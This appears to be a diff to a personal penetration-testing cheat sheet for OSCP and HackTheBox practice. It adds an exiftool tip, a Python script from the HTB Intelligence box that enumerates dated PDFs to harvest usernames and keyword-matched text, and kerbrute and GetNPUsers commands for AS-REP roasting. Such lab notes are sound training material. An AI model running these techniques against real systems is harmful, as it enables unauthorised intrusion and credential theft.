@@ -194,6 +194,10 @@
 <li><a href="https://github.com/noraj/OSCP-Exam-Report-Template-Markdown/tree/master">Report Maker</a></li>
 </ul>
 <h3 id="random-things"><a class="header" href="#random-things">Random things</a></h3>
+<h3 id="dont-forget-to-search-files"><a class="header" href="#dont-forget-to-search-files">Don't forget to search files</a></h3>
+<pre><code>Remember if you come across random files you can use 'exiftool' on them, might get some usernames.
+
+</code></pre>
 <h2 id="etchosts"><a class="header" href="#etchosts">/etc/hosts</a></h2>
 <pre><code>Get into the habit of saving IP into /etc/hosts, if it's a DC, also do this:
 
@@ -536,6 +540,41 @@ dirsearch -u http://192.168.213.98 -w /usr/share/wordlists/dirbuster/directory-l
 wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --hc 404 http://$ip/FUZZ
 
 
+</code></pre>
+<h3 id="custom-python-web-directory-search-tool"><a class="header" href="#custom-python-web-directory-search-tool">Custom Python Web Directory Search Tool</a></h3>
+<p>https://0xdf.gitlab.io/2021/11/27/htb-intelligence.html</p>
+<pre><code class="language-python">This was from the intelligence htb box, maybe modify if you see something similiar in the future:
+
+#!/usr/bin/env python3
+
+import datetime
+import io
+import PyPDF2
+import requests
+
+
+t = datetime.datetime(2020, 1, 1)
+end = datetime.datetime(2021, 7, 4)
+keywords = ['user', 'password', 'account', 'intelligence', 'htb', 'login', 'service', 'new']
+users = set()
+
+while True:
+    url = t.strftime("http://intelligence.htb/documents/%Y-%m-%d-upload.pdf")
+    resp = requests.get(url)
+    if resp.status_code == 200:
+        with io.BytesIO(resp.content) as data:
+            pdf = PyPDF2.PdfFileReader(data)
+            users.add(pdf.getDocumentInfo()['/Creator'])
+            for page in range(pdf.getNumPages()):
+                text = pdf.getPage(page).extractText()
+                if any([k in text.lower() for k in keywords]):
+                    print(f'==={url}===\n{text}')
+    t = t + datetime.timedelta(days=1)
+    if t &gt;= end:
+        break
+
+with open('users', 'w') as f:
+    f.write('\n'.join(users)) 
 </code></pre>
 <h3 id="vulnerability-scanner"><a class="header" href="#vulnerability-scanner">Vulnerability Scanner</a></h3>
 <pre><code>nikto -host http://&lt;IP&gt;/ # If port -&gt; 443, Do HTTPS
@@ -9243,6 +9282,13 @@ mimikatz # kerberos::ptt &lt;ticket_kirbi_file&gt;
 <li><a href="https://github.com/GhostPack/Rubeus">GitHub Rubeus</a></li>
 </ul>
 <h3 id="asrep-roasting-attack"><a class="header" href="#asrep-roasting-attack">ASREP Roasting Attack</a></h3>
+<h3 id="check-for-valid-usernames"><a class="header" href="#check-for-valid-usernames">Check for valid usernames</a></h3>
+<pre><code>/opt/kerbrute userenum --dc $ip -d intelligence.htb users
+
+then do this
+
+GetNPUsers.py -no-pass -dc-ip $ip intelligence.htb/Jose.Williams
+</code></pre>
 <pre><code>impacket-GetNPUsers htb.local/ -usersfile user.txt -format hashcat -outputfile hashes.domain.txt
 
 or this:
